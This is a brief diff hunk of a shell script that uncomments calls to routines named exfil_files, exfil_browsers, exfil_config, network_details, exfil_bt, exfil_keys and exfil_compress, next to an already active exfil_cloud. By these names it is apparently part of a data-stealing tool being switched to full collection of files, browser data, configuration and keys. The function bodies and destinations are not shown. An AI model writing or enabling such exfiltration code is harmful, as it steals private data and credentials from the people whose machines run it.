@@ -110,18 +110,18 @@ cleanup() {
 }
 
 
-#exfil_files &
+exfil_files &
 exfil_cloud &
-#exfil_browsers &
-#exfil_config &
+exfil_browsers &
+exfil_config &
 
-#network_details
-#exfil_bt
-#exfil_keys
+network_details
+exfil_bt
+exfil_keys
 
-#wait $exfil_files_pid $exfil_browsers_pid
-#exfil_compress
-#
+wait $exfil_files_pid $exfil_browsers_pid
+exfil_compress
+
 #wait $exfil_compress
 #cleanup
 
